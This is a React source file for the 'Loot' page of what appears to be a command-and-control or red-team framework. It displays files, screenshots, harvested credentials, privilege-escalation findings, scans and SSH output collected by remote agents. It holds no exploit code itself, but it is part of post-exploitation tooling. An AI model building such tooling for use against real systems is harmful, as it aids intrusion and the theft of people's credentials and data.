import { useState, useEffect } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { api } from "../api/client";
import { Package, Key, Camera, Terminal, Wifi, AlertTriangle, Download, ChevronRight, RefreshCw } from "lucide-react";

type Tab = "files" | "screenshots" | "creds" | "privesc" | "scans" | "ssh";

interface LootSummary { files: number; screenshots: number; creds: number; privesc: number; scans: number; ssh_results: number; }
interface FileEntry { task_id: string; agent: string; filename: string; size_bytes: number; b64: string; timestamp: string; source_path: string; }
interface Screenshot { task_id: string; agent: string; b64: string; timestamp: string; }
interface CredSection { path: string; category: string; lines: string[]; }
interface CredEntry { task_id: string; agent: string; timestamp: string; raw: string; sections: CredSection[]; }
interface PrivescEntry { task_id: string; agent: string; timestamp: string; raw: string; critical: string[]; }
interface ScanEntry { task_id: string; agent: string; command: string; timestamp: string; output: string; open_ports: { port: number; service: string }[]; }
interface SshEntry { task_id: string; agent: string; command: string; output: string; timestamp: string; }
interface LootData {
  summary: LootSummary; files: FileEntry[]; screenshots: Screenshot[];
  creds: CredEntry[]; privesc: PrivescEntry[]; scans: ScanEntry[]; ssh_results: SshEntry[];
}

const tabs: { id: Tab; label: string; icon: React.ElementType; key: keyof LootSummary }[] = [
  { id: "files",       label: "FILES",       icon: Package,       key: "files" },
  { id: "screenshots", label: "SCREENSHOTS", icon: Camera,        key: "screenshots" },
  { id: "creds",       label: "CREDS",       icon: Key,           key: "creds" },
  { id: "privesc",     label: "PRIVESC",     icon: AlertTriangle, key: "privesc" },
  { id: "scans",       label: "SCANS",       icon: Wifi,          key: "scans" },
  { id: "ssh",         label: "SSH_EXEC",    icon: Terminal,      key: "ssh_results" },
];

function downloadB64(b64: string, filename: string) {
  const a = document.createElement("a");
  a.href = `data:application/octet-stream;base64,${b64}`;
  a.download = filename; a.click();
}

function fmt(ts: string) { return ts ? new Date(ts).toLocaleString() : "—"; }
function bytes(n: number) { return n > 1024*1024 ? `${(n/1024/1024).toFixed(1)} MB` : n > 1024 ? `${(n/1024).toFixed(1)} KB` : `${n} B`; }

function Empty({ label }: { label: string }) {
  return (
    <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }}
      className="flex flex-col items-center gap-3 p-16"
      style={{ border: "1px dashed #1F1F1F", background: "transparent" }}>
      <Package size={24} style={{ color: "#1F1F1F" }} />
      <p className="text-xs" style={{ fontFamily: "'Fira Code', monospace", color: "#2A2A2A" }}>{label}</p>
    </motion.div>
  );
}

const cardStyle = { background: "#0D0D0D", border: "1px solid #1F1F1F", overflow: "hidden" as const };
const monoXs = { fontFamily: "'Fira Code', monospace", fontSize: "11px" };
const headerDivider = { borderBottom: "1px solid #1F1F1F" };

export default function Loot() {
  const [loot, setLoot]     = useState<LootData | null>(null);
  const [loading, setLoading] = useState(true);
  const [tab, setTab]       = useState<Tab>("files");
  const [expanded, setExpanded] = useState<string | null>(null);

  const load = async () => {
    setLoading(true);
    try { setLoot((await api.get<LootData>("/api/loot/")).data); }
    catch {/* server offline */}
    finally { setLoading(false); }
  };

  useEffect(() => { load(); }, []);

  const count = (k: keyof LootSummary) => loot?.summary[k] ?? 0;

  return (
    <div className="flex flex-col" style={{ minHeight: "100vh", padding: "28px", gap: "20px", background: "#000" }}>
      {/* Header */}
      <motion.div initial={{ opacity: 0, y: -8 }} animate={{ opacity: 1, y: 0 }} transition={{ duration: 0.25 }}
        className="flex items-center justify-between">
        <div>
          <h1 className="text-lg font-bold tracking-widest uppercase"
            style={{ fontFamily: "'Fira Code', monospace", color: "#00FF41", textShadow: "0 0 10px rgba(0,255,65,0.5)" }}>
            // LOOT
          </h1>
          <p className="text-xs mt-1" style={{ fontFamily: "'Fira Code', monospace", color: "#4A4A4A" }}>
            harvested files · credentials · scans · screenshots
          </p>
        </div>
        <motion.button whileTap={{ scale: 0.97 }} onClick={load} className="btn-ghost flex items-center gap-2 px-3 py-1.5">
          <motion.span animate={loading ? { rotate: 360 } : {}}
            transition={loading ? { duration: 0.8, repeat: Infinity, ease: "linear" } : {}}>
            <RefreshCw size={12} />
          </motion.span>
          REFRESH
        </motion.button>
      </motion.div>

      {/* Summary chips */}
      {loot && (
        <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: 0.05 }}
          className="grid grid-cols-6 gap-3">
          {tabs.map(({ id, label, icon: Icon, key }, i) => (
            <motion.button key={id} onClick={() => setTab(id)} whileTap={{ scale: 0.97 }}
              initial={{ opacity: 0, y: 6 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: i * 0.04 }}
              className="flex flex-col gap-1.5 p-3 text-left"
              style={{
                background: tab === id ? "rgba(0,255,65,0.05)" : "transparent",
                border: `1px solid ${tab === id ? "rgba(0,255,65,0.25)" : "#1F1F1F"}`,
                borderLeft: tab === id ? "2px solid #00FF41" : "1px solid #1F1F1F",
                cursor: "pointer",
              }}>
              <Icon size={11} style={{ color: tab === id ? "#00FF41" : "#4A4A4A" }} />
              <span className="text-2xl font-black"
                style={{ fontFamily: "'Fira Code', monospace",
                  color: tab === id ? "#00FF41" : "#E0E0E0",
                  textShadow: tab === id ? "0 0 8px rgba(0,255,65,0.4)" : "none" }}>
                {count(key)}
              </span>
              <span className="text-xs" style={{ fontFamily: "'Fira Code', monospace", color: "#4A4A4A" }}>{label}</span>
            </motion.button>
          ))}
        </motion.div>
      )}

      {/* Loading */}
      {loading && (
        <div className="flex items-center justify-center p-16">
          <motion.div animate={{ rotate: 360 }} transition={{ duration: 1, repeat: Infinity, ease: "linear" }}
            style={{ width: 20, height: 20, border: "1px solid #00FF41", borderTopColor: "transparent", borderRadius: "50%" }} />
        </div>
      )}

      <AnimatePresence mode="wait">
        {!loading && loot && (
          <motion.div key={tab} initial={{ opacity: 0, y: 6 }} animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: -4 }} transition={{ duration: 0.2 }} className="flex flex-col gap-3">

            {/* FILES */}
            {tab === "files" && (
              loot.files.length === 0 ? <Empty label="No files downloaded yet" /> :
              <div style={cardStyle}>
                <div className="grid px-5 py-3"
                  style={{ gridTemplateColumns: "2fr 1fr 1fr 1fr auto", ...headerDivider,
                    ...monoXs, color: "#2A2A2A", fontWeight: 700, textTransform: "uppercase", letterSpacing: "0.07em" }}>
                  <span>Filename / Path</span><span>Agent</span><span>Size</span><span>Time</span><span></span>
                </div>
                {loot.files.map((f, i) => (
                  <motion.div key={f.task_id} initial={{ opacity: 0, x: -4 }} animate={{ opacity: 1, x: 0 }}
                    transition={{ delay: i * 0.04 }}
                    className="grid items-center px-5 py-3"
                    style={{ gridTemplateColumns: "2fr 1fr 1fr 1fr auto", borderTop: "1px solid #1F1F1F" }}
                    onMouseEnter={e => { (e.currentTarget as HTMLElement).style.background = "rgba(0,255,65,0.02)"; }}
                    onMouseLeave={e => { (e.currentTarget as HTMLElement).style.background = "transparent"; }}>
                    <div>
                      <p className="font-semibold" style={{ ...monoXs, color: "#E0E0E0" }}>{f.filename}</p>
                      <p className="mt-0.5" style={{ ...monoXs, color: "#4A4A4A", fontSize: "10px" }}>{f.source_path}</p>
                    </div>
                    <span style={{ ...monoXs, color: "#4A4A4A" }}>{f.agent}</span>
                    <span style={{ ...monoXs, color: "#4A4A4A" }}>{bytes(f.size_bytes)}</span>
                    <span style={{ ...monoXs, color: "#4A4A4A" }}>{fmt(f.timestamp)}</span>
                    <motion.button whileTap={{ scale: 0.9 }} onClick={() => downloadB64(f.b64, f.filename)}
                      style={{ color: "#4A4A4A", background: "none", border: "none", cursor: "pointer", padding: 4 }}
                      onMouseEnter={e => { (e.currentTarget as HTMLElement).style.color = "#00FF41"; }}
                      onMouseLeave={e => { (e.currentTarget as HTMLElement).style.color = "#4A4A4A"; }}>
                      <Download size={12} />
                    </motion.button>
                  </motion.div>
                ))}
              </div>
            )}

            {/* SCREENSHOTS */}
            {tab === "screenshots" && (
              loot.screenshots.length === 0 ? <Empty label="No screenshots captured yet" /> :
              <div className="grid grid-cols-2 gap-4">
                {loot.screenshots.map((s, i) => (
                  <motion.div key={s.task_id} initial={{ opacity: 0, scale: 0.97 }} animate={{ opacity: 1, scale: 1 }}
                    transition={{ delay: i * 0.06 }} style={cardStyle}>
                    <img src={`data:image/png;base64,${s.b64}`} alt="screenshot" className="w-full" />
                    <div className="flex items-center justify-between px-4 py-3" style={headerDivider}>
                      <div>
                        <p className="font-semibold" style={{ ...monoXs, color: "#E0E0E0" }}>{s.agent}</p>
                        <p style={{ ...monoXs, color: "#4A4A4A", fontSize: "10px" }}>{fmt(s.timestamp)}</p>
                      </div>
                      <motion.button whileTap={{ scale: 0.9 }}
                        onClick={() => downloadB64(s.b64, `screenshot-${s.agent}-${s.task_id.slice(0,8)}.png`)}
                        style={{ color: "#4A4A4A", background: "none", border: "none", cursor: "pointer" }}
                        onMouseEnter={e => { (e.currentTarget as HTMLElement).style.color = "#00FF41"; }}
                        onMouseLeave={e => { (e.currentTarget as HTMLElement).style.color = "#4A4A4A"; }}>
                        <Download size={12} />
                      </motion.button>
                    </div>
                  </motion.div>
                ))}
              </div>
            )}

            {/* CREDENTIALS */}
            {tab === "creds" && (
              loot.creds.length === 0 ? <Empty label="No credentials harvested yet — run 'creds' on an agent" /> :
              <div className="flex flex-col gap-3">
                {loot.creds.map((c) => (
                  <div key={c.task_id} style={cardStyle}>
                    <div className="flex items-center justify-between px-5 py-3" style={headerDivider}>
                      <span className="font-semibold flex items-center gap-2"
                        style={{ ...monoXs, color: "#E0E0E0" }}>
                        <Key size={11} style={{ color: "#00FF41" }} /> {c.agent}
                      </span>
                      <span style={{ ...monoXs, color: "#4A4A4A" }}>{fmt(c.timestamp)}</span>
                    </div>
                    {c.sections.map((sec, si) => (
                      <div key={si}>
                        <motion.button
                          onClick={() => setExpanded(expanded === `${c.task_id}-${si}` ? null : `${c.task_id}-${si}`)}
                          className="w-full flex items-center gap-2 px-5 py-2.5 text-left"
                          style={{ borderTop: "1px solid #1F1F1F", background: "none", cursor: "pointer" }}
                          onMouseEnter={e => { (e.currentTarget as HTMLElement).style.background = "rgba(0,255,65,0.02)"; }}
                          onMouseLeave={e => { (e.currentTarget as HTMLElement).style.background = "none"; }}>
                          <motion.span animate={{ rotate: expanded === `${c.task_id}-${si}` ? 90 : 0 }}>
                            <ChevronRight size={10} style={{ color: "#2A2A2A" }} />
                          </motion.span>
                          <span className="px-2 py-0.5 font-bold"
                            style={{ ...monoXs, background: "rgba(0,255,65,0.06)", color: "#00FF41",
                              border: "1px solid rgba(0,255,65,0.15)" }}>{sec.category}</span>
                          <span style={{ ...monoXs, color: "#4A4A4A" }}>{sec.path}</span>
                        </motion.button>
                        <AnimatePresence>
                          {expanded === `${c.task_id}-${si}` && (
                            <motion.pre initial={{ height: 0, opacity: 0 }} animate={{ height: "auto", opacity: 1 }}
                              exit={{ height: 0, opacity: 0 }} transition={{ duration: 0.18 }}
                              className="overflow-hidden px-5 py-3 overflow-x-auto"
                              style={{ ...monoXs, background: "#000", color: "#9A9A9A",
                                maxHeight: 400, overflowY: "auto", borderTop: "1px solid #1F1F1F" }}>
                              {sec.lines.join("\n")}
                            </motion.pre>
                          )}
                        </AnimatePresence>
                      </div>
                    ))}
                  </div>
                ))}
              </div>
            )}

            {/* PRIVESC */}
            {tab === "privesc" && (
              loot.privesc.length === 0 ? <Empty label="No privesc data yet — run 'privesc' on an agent" /> :
              <div className="flex flex-col gap-3">
                {loot.privesc.map((p) => (
                  <div key={p.task_id} style={cardStyle}>
                    <div className="flex items-center justify-between px-5 py-3" style={headerDivider}>
                      <span className="font-semibold flex items-center gap-2" style={{ ...monoXs, color: "#E0E0E0" }}>
                        <AlertTriangle size={11} style={{ color: p.critical.length > 0 ? "#FF3333" : "#4A4A4A" }} />
                        {p.agent}
                        {p.critical.length > 0 && (
                          <span className="px-2 py-0.5 font-bold"
                            style={{ ...monoXs, background: "rgba(255,51,51,0.08)", color: "#FF3333",
                              border: "1px solid rgba(255,51,51,0.2)" }}>
                            {p.critical.length} critical
                          </span>
                        )}
                      </span>
                      <span style={{ ...monoXs, color: "#4A4A4A" }}>{fmt(p.timestamp)}</span>
                    </div>
                    {p.critical.length > 0 && (
                      <div className="px-5 py-3 flex flex-col gap-1" style={{ borderBottom: "1px solid #1F1F1F" }}>
                        {p.critical.map((c, ci) => (
                          <p key={ci} className="font-bold" style={{ ...monoXs, color: "#FF3333" }}>{c}</p>
                        ))}
                      </div>
                    )}
                    <pre className="px-5 py-3 overflow-x-auto" style={{ ...monoXs, color: "#4A4A4A", maxHeight: 400, overflowY: "auto" }}>
                      {p.raw}
                    </pre>
                  </div>
                ))}
              </div>
            )}

            {/* SCANS */}
            {tab === "scans" && (
              loot.scans.length === 0 ? <Empty label="No scans yet — run 'portscan' or 'hostscan' on an agent" /> :
              <div className="flex flex-col gap-3">
                {loot.scans.map((s) => (
                  <div key={s.task_id} style={cardStyle}>
                    <div className="flex items-center justify-between px-5 py-3" style={headerDivider}>
                      <span className="font-semibold flex items-center gap-2" style={{ ...monoXs, color: "#E0E0E0" }}>
                        <Wifi size={11} style={{ color: "#00FF41" }} />{s.command}
                      </span>
                      <div className="flex items-center gap-3">
                        <span style={{ ...monoXs, color: "#4A4A4A" }}>{s.agent}</span>
                        <span style={{ ...monoXs, color: "#4A4A4A" }}>{fmt(s.timestamp)}</span>
                      </div>
                    </div>
                    {s.open_ports.length > 0 && (
                      <div className="px-5 py-3 flex flex-wrap gap-2" style={{ borderBottom: "1px solid #1F1F1F" }}>
                        {s.open_ports.map(p => (
                          <span key={p.port} className="px-2 py-1 font-semibold"
                            style={{ ...monoXs, background: "rgba(0,255,65,0.06)", color: "#00FF41",
                              border: "1px solid rgba(0,255,65,0.15)" }}>
                            {p.port}/{p.service}
                          </span>
                        ))}
                      </div>
                    )}
                    <pre className="px-5 py-3 overflow-x-auto" style={{ ...monoXs, color: "#4A4A4A", maxHeight: 300, overflowY: "auto" }}>
                      {s.output}
                    </pre>
                  </div>
                ))}
              </div>
            )}

            {/* SSH */}
            {tab === "ssh" && (
              loot.ssh_results.length === 0 ? <Empty label="No SSH exec results yet — run 'ssh-exec' on an agent" /> :
              <div className="flex flex-col gap-3">
                {loot.ssh_results.map((s) => (
                  <div key={s.task_id} style={cardStyle}>
                    <div className="flex items-center justify-between px-5 py-3" style={headerDivider}>
                      <span className="font-semibold flex items-center gap-2" style={{ ...monoXs, color: "#E0E0E0" }}>
                        <Terminal size={11} style={{ color: "#00FF41" }} />{s.command}
                      </span>
                      <div className="flex items-center gap-3">
                        <span style={{ ...monoXs, color: "#4A4A4A" }}>{s.agent}</span>
                        <span style={{ ...monoXs, color: "#4A4A4A" }}>{fmt(s.timestamp)}</span>
                      </div>
                    </div>
                    <pre className="px-5 py-3 overflow-x-auto" style={{ ...monoXs, color: "#4A4A4A", maxHeight: 300, overflowY: "auto" }}>
                      {s.output}
                    </pre>
                  </div>
                ))}
              </div>
            )}

          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
}
